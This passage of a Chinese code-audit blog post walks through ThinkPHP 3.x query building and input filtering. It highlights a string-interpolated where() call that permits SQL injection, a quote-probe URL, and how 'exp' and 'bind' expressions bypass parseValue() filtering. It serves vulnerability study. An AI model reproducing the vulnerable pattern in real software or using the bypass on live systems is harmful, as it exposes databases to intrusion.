class="hljs-string">&#x27;get.name&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>); <span class="hljs-comment">// 采用htmlspecialchars方法对$_GET[&#x27;name&#x27;] 进行过滤，如果不存在则返回空字符串</span><br></code></pre></td></tr></table></figure><p>如果没有传入过滤的方法，系统会采用默认的过滤机制，这个可以在配置文件中获取</p><h3 id="C方法"><a href="#C方法" class="headerlink" title="C方法"></a>C方法</h3><p>读取配置文件里面的数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//读取当前的URL模式配置参数</span><br><span class="hljs-variable">$model</span> = C(<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="M方法-D方法"><a href="#M方法-D方法" class="headerlink" title="M方法/D方法"></a>M方法/D方法</h3><p>用于数据模型的实例化操作，具体这两个方法怎么实现，有什么区别，暂时就不多关注了，只用知道通过这两个快捷方法能快速实例化一个数据模型对象，从而操作数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//实例化模型</span><br><span class="hljs-comment">// 相当于 $User = new \Home\Model\UserModel();</span><br><span class="hljs-variable">$User</span> = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 和用法 $User = new \Think\Model(&#x27;User&#x27;); 等效</span><br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&#x27;User&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>TP3 是基于 MVC 模式的架构，数据库和程序大部分逻辑都在<strong>模型M</strong>处处理。TP3 在<strong>模型M</strong>的底层设计上，出现了很多 sql 注入这样的问题，这里复现它的漏洞前，先熟悉一下底层的设计</p><h3 id="Think-Model类"><a href="#Think-Model类" class="headerlink" title="\Think\Model类"></a>\Think\Model类</h3><p>TP3 的<strong>模型基类</strong>为 <strong>\Think\Model类</strong>，在 <strong>ThinkPHP/Library/Think/Model.class.php</strong> 中被定义。该类实现了ActiveRecord模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Think</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> </span>&#123;<br>  <span class="hljs-comment">// 当前数据库操作对象</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span>               =   <span class="hljs-literal">null</span>;<br>  <span class="hljs-comment">// 数据表前缀，默认从获取配置文件中获取，默认配置为 think_</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tablePrefix</span>      =   <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">// 模型名称</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>             =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据库名称</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$dbName</span>           =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据库配置</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$connection</span>       =   <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 数据表名（不包含表前缀），一般情况下默认和模型名称相同</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tableName</span>        =   <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-comment">// 取得DB类的实例对象 字段检查</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$tablePrefix</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$connection</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-comment">// 建立数据库连接,数据库连接句柄最终保存在$this-&gt;db</span><br>        <span class="hljs-keyword">$this</span>-&gt;db(<span class="hljs-number">0</span>,<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;connection)?<span class="hljs-variable">$connection</span>:<span class="hljs-keyword">$this</span>-&gt;connection,<span class="hljs-literal">true</span>);<br>    &#125;<br>  ……<br></code></pre></td></tr></table></figure><h3 id="继承模型基类示例"><a href="#继承模型基类示例" class="headerlink" title="继承模型基类示例"></a>继承模型基类示例</h3><p>生成 Application/Home/Model/UserModel.class.php ，定义了一个 UserModel 模型类继承了模型基类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Model</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserModel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span> </span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="模型实例化"><a href="#模型实例化" class="headerlink" title="模型实例化"></a>模型实例化</h3><p>模型实例化有以下几种方法：</p><p>1）首先通过类名可以直接实例化</p><p>实例化上面定义的 UserModel 类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = <span class="hljs-keyword">new</span> \Home\Model\UserModel();<br></code></pre></td></tr></table></figure><p>2）另外 ThinkPHP 还提供了快捷方法，用于实例化模型：<strong>D方法</strong>和<strong>M方法</strong></p><p>D 方法用于实例化具体的模型类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//实例化模型</span><br><span class="hljs-variable">$User</span> = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 相当于 $User = new \Home\Model\UserModel();</span><br><span class="hljs-comment">// 执行具体的数据操作</span><br><span class="hljs-variable">$User</span>-&gt;select();<br></code></pre></td></tr></table></figure><p>M 方法不会加载具体的类，而是直接实例化利用模型基类，只定义一个名字，这样就能指定对应的表名，性能会高一点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用M方法实例化</span><br><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-comment">// 和用法 $User = new \Think\Model(&#x27;User&#x27;); 等效</span><br><span class="hljs-comment">// 执行其他的数据操作</span><br><span class="hljs-variable">$User</span>-&gt;select();<br></code></pre></td></tr></table></figure><p>3）实例化空模型类</p><p>使用原生SQL查询的话，不需要使用额外的模型类，实例化一个空模型类即可进行操作了，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//实例化空模型</span><br><span class="hljs-variable">$Model</span> = <span class="hljs-keyword">new</span> Model();<br><span class="hljs-comment">//或者使用M快捷方法是等效的</span><br><span class="hljs-variable">$Model</span> = M();<br><span class="hljs-comment">//进行原生的SQL查询</span><br><span class="hljs-variable">$Model</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM think_user WHERE status = 1&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="模型基类的数据库操作"><a href="#模型基类的数据库操作" class="headerlink" title="模型基类的数据库操作"></a>模型基类的数据库操作</h3><p>TP3 <strong>模型基础类Model类</strong> 提供了很多操作数据库的方法，下面看一下一些常用方法：</p><ul><li>where()</li></ul><p>决定 where 字段的构造</p><p>where方法的参数支持字符串和数组，主要用于获取sql语句的where部分</p><p>1）参数为数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br></code></pre></td></tr></table></figure><p>最后执行的SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;wang&#x27;</span><br></code></pre></td></tr></table></figure><p>2）参数为字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;%s&#x27;&quot;</span>,<span class="hljs-variable">$name</span>)-&gt;select();<br></code></pre></td></tr></table></figure><p>最后执行的sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> ( username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;wang&#x27;</span> )<br></code></pre></td></tr></table></figure><p>3）<strong>存在漏洞的用法</strong></p><p>然后我就发现一种存在漏洞的写法，通过双引号包裹参数变量自动解析，这样传入的参数不会被过滤，通过闭合单引号和括号就能造成sql注入，即使这里使用 <strong>I方法</strong> 过滤也无效，从而造成sql注入，在代码审计时可以注意下程序中是否存在这个情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br><span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;username=&#x27;<span class="hljs-subst">$name</span>&#x27;&quot;</span>)-&gt;select();<br></code></pre></td></tr></table></figure><p>实际sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> ( username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xy&#x27;</span> )<br></code></pre></td></tr></table></figure><ul><li>select()</li></ul><p>执行 select 查询，获取数据表中的多行记录</p><ul><li>find()</li></ul><p>执行 select 查询，读取数据表中的一行数据</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TP 3还提供链式操作，假如我们现在要查询一个User表的满足状态为1的前10条记录，并希望按照用户的创建时间排序</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;status=1&#x27;</span>)-&gt;order(<span class="hljs-string">&#x27;create_time&#x27;</span>)-&gt;limit(<span class="hljs-number">10</span>)-&gt;select();<br></code></pre></td></tr></table></figure><h1 id="0x02-安全过滤机制"><a href="#0x02-安全过滤机制" class="headerlink" title="0x02 安全过滤机制"></a>0x02 安全过滤机制</h1><p>TP3 在<strong>I方法</strong>和数据库操作时都提供有自动安全过滤的操作</p><h2 id="I-方法的安全过滤"><a href="#I-方法的安全过滤" class="headerlink" title="I 方法的安全过滤"></a>I 方法的安全过滤</h2><blockquote><p>ThinkPHP/Common/functions.php</p></blockquote><p>下面对 <strong>I方法</strong> 的代码做了大量化简，保留了关键逻辑代码</p><ul><li><code>$name</code> 参数是一个字符串，前面提到的格式有 <code>get.id, post.name/s</code>，<strong>I方法</strong>就需要对这样的字符串做解析</li><li>首先<strong>I方法</strong>解析出<code>$name</code>字符串中接收数据的方法 <code>$method</code>，数据类型和数据 <code>$data</code></li><li>通过<code>$filter</code>方法对<code>$data</code>做过滤，一般<code>$filter</code>为空，就会调用系统默认过滤方式<code>htmlspecialchars</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>, <span class="hljs-comment">// 默认参数过滤方法 用于I函数...</span><br></code></pre></td></tr></table></figure><ul><li>最后 <code>$data</code> 还要通过 <code>think_filter()</code> 检查，就是匹配数据中是否具有敏感字符，如果 <code>$data</code> 匹配到敏感字符就在数据后添加一个空格，这步操作看似很奇怪，后面会讲这么做的用途</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$default</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filter</span>=<span class="hljs-literal">null</span>,<span class="hljs-variable">$datas</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27;.&#x27;</span>)) &#123; <span class="hljs-comment">// 指定参数来源</span><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$name</span>) =   explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$name</span>,<span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 默认为自动判断</span><br>        <span class="hljs-variable">$method</span> =   <span class="hljs-string">&#x27;param&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span>(strtolower(<span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;get&#x27;</span>     :   <br>        <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_GET</span>;<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;post&#x27;</span>    :   <br>        <span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-keyword">break</span>;<br>        ……<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$input</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$input</span>[<span class="hljs-variable">$name</span>];<br>    <span class="hljs-comment">// 根据 $filter 过滤数据</span><br>    <span class="hljs-variable">$data</span> = is_array(<span class="hljs-variable">$data</span>) ? array_map_recursive(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$data</span>) : <span class="hljs-variable">$filter</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// 调用 think_filter()</span><br>    is_array(<span class="hljs-variable">$data</span>) &amp;&amp; array_walk_recursive(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;think_filter&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br><span class="hljs-comment">// 检查敏感字符</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里注意 thinkphp3.2.3 中敏感字符不包含BIND，该版本就因为这一点存在一个sql注入的风险</p><h2 id="数据库操作的安全过滤"><a href="#数据库操作的安全过滤" class="headerlink" title="数据库操作的安全过滤"></a>数据库操作的安全过滤</h2><p>通过<strong>I方法</strong>获取外部数据默认会做一些安全过滤，上面看到的系统默认配置有 htmlspecialchars，这个方法能防御大部分的xss注入。因为现在很多程序会使用预编译，所以 TP 中一般不采用<strong>I方法</strong>对外部数据做sql注入的过滤</p><p>所以 TP3 在数据库操作上也有自己的安全过滤方式，TP3有自己的预编译处理方式，在没有使用预编译的情况下，TP3才会做addslash()这样的过滤，而TP3中出现的sql注入问题就是在没有使用预编译的情况下，忽略了一些该过滤的地方</p><p>在这里实在佩服挖到这些漏洞的大佬，最近看MVC模式的代码理解流程都很困难，他们却在复杂的代码中找到关键的问题</p><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><p>本小节主要通过如下示例代码分析TP3是如何处理sql操作，如何拼接sql语句，如何做安全过滤等操作</p><p>这是一个常见的外部输入where查询条件的sql操作，对TP3数据库操作有一定的普适性</p><blockquote><p>Application/Home/Controller/IndexController.class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问下面的链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp.test:<span class="hljs-number">8888</span><span class="hljs-regexp">/index.php/</span>home<span class="hljs-regexp">/index/</span>test?name=s<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>最终执行的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>下面将仔细分析示例程序sql执行的流程</p><p>按照链式操作的顺序，会依次执行field()、where()、select()。field()用于处理查询的字段，这里数据不可控，我们也不关注了</p><h3 id="where-方法"><a href="#where-方法" class="headerlink" title="where()方法"></a>where()方法</h3><p>先看where()的逻辑，<code>where()</code> 用于构造sql语句的<strong>where条件语句部分</strong>，这是常见的sql注入点。前面提到，模型类提供的<code>where()</code>方法可以接收数组参数或字符串参数 <code>$where</code>，然后 <code>where()</code> 方法将会把相关数据解析到模型对象的 <code>options</code> 数组属性中，用于后续拼接完整的sql语句</p><ul><li>如果 <code>$where</code> 为字符串时，<code>$parse</code> 为传入 <code>where()</code> 的另一个参数，将会被<code>escapeString</code>过滤，然后将<code>$parse</code>格式化放在<code>$where</code>中，最后该字符串的值被放在 <code>$where[&#39;_string&#39;]</code> 中。这里过滤的明明白白，就不在考虑这种写法的sql注入问题了</li><li>如果 <code>$where</code> 为数组，也是官方推荐的一种方式，在 <code>where()</code> 方法中并没有直接过滤，我们需要关注后续对该值的处理</li><li><code>$where</code> 最终将放在当前模型对象的 <code>options[&#39;where&#39;]</code> 中，供后面处理</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">where</span>(<span class="hljs-params"><span class="hljs-variable">$where</span>,<span class="hljs-variable">$parse</span>=<span class="hljs-literal">null</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!is_null(<span class="hljs-variable">$parse</span>) &amp;&amp; is_string(<span class="hljs-variable">$where</span>)) &#123;<br>            <span class="hljs-variable">$parse</span> = array_map(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;db,<span class="hljs-string">&#x27;escapeString&#x27;</span>),<span class="hljs-variable">$parse</span>);<br>            <span class="hljs-variable">$where</span> =   vsprintf(<span class="hljs-variable">$where</span>,<span class="hljs-variable">$parse</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$where</span>) &amp;&amp; <span class="hljs-string">&#x27;&#x27;</span> != <span class="hljs-variable">$where</span>)&#123;<br>            <span class="hljs-variable">$map</span>    =   <span class="hljs-keyword">array</span>();<br>            <span class="hljs-variable">$map</span>[<span class="hljs-string">&#x27;_string&#x27;</span>]   =   <span class="hljs-variable">$where</span>;<br>            <span class="hljs-variable">$where</span>  =   <span class="hljs-variable">$map</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>] =   array_merge(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>],<span class="hljs-variable">$where</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>] =   <span class="hljs-variable">$where</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="select-方法"><a href="#select-方法" class="headerlink" title="select() 方法"></a>select() 方法</h3><p>上面知道如果传入where()的参数为字符串，则直接会被过滤，那传入数组参数是否会经过安全检测呢？</p><p>接下来看看select()是怎么处理的，where()方法将<strong>where字段</strong>部分数据放到了模型对象的options数组属性中保存，select()方法将主要通过options数组组成最终的sql语句，其底层将由 <code>ThinkPHP/Library/Think/Db/Driver.class.php</code> 封装完成，过程比较复杂，下面用一张图简诉其流程</p><p>![image-20210726185914064](img/ThinkPHP3.x 漏洞总结/image-20210726185914064.png)</p><p>可以看到最终的sql语句将由 buildSelectSql() 完成，其中由parseTable(),parseWhere()等若干方法完成sql语句各个set字段的组成</p><p>其中where字段由parseWhere()解析，因为前面对字符串参数已经过滤了，parseWhere()并没有在做过滤（具体代码上图忽略了），而是对数组参数进行了过滤，处理细节位于parseWhereItem()，我们需要关注parseWhereItem()是否做到了严丝合缝</p><h3 id="parseWhereItem"><a href="#parseWhereItem" class="headerlink" title="parseWhereItem()"></a>parseWhereItem()</h3><ul><li>**parseWhereItem()**接收两个参数 <code>$key</code> 和 <code>$val</code>，分别来自为 <code>opention[&#39;where&#39;]</code> 的键和值</li><li>首先需要知道的是最终过滤的方法是 <code>parseValue()</code>，过滤的值是 <code>$val</code>，过滤后的 <code>$var</code> 和 <code>$key</code> 组成 <code>$whereStr</code> 即最终的where字段</li><li>当 <code>$val</code> 为数组形式时，会进入一个表达式判断，<code>$exp=$val[0]</code>，<code>$exp</code>即为表达式，sql代码的表达式有EQ（等于）、LIKE（模糊查询等）……<ul><li>可以看到，当 <code>$exp</code> 的值为<strong>bind，exp，IN 运算符</strong>时，不会经过 <strong>parseValue()</strong> 的过滤，那么这里就有可能存在一种绕过过滤的可能</li><li><code>$exp</code> 值为bind时，where语句会加上 <code>= :</code>，这会影响后面注入的语句（不过有人发现delete等方法可以消除该符号的影响，这个漏洞后面会具体分析）；为IN运算符时，最后构造的sql语句会加上in运算符，稍有干扰；值为exp似乎是最佳选择</li></ul></li><li>当 <code>$val</code> 不为数组形式时，必会受到parseValue()的过滤，遂放弃</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 